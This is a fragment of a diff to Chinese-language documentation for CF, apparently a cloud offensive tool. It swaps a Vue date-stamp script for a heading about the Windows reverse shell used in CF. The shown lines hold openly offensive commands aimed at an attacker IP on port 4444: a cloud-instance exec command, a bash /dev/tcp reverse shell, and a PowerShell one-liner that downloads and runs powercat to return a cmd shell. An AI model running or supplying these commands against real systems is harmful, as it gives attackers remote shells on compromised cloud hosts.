@@ -24,13 +24,8 @@ cf alibaba ecs exec --lhost 123.123.123.123 --lport 4444 -i i-abcdefghijklmn
 bash -i >& /dev/tcp/123.123.123.123/4444 0>&1
 ```
 
-<script>
-export default {
-    mounted () {
-      this.$page.lastUpdated = "2022年7月18日"
-    }
-  }
-</script>
+在 CF 中使用的 Windows 反弹 Shell 如下
+
 
 ```bash
 powershell IEX (New-Object System.Net.Webclient).DownloadString('https://ghproxy.com/raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1');powercat -c 123.123.123.123 -p 4444 -e cmd
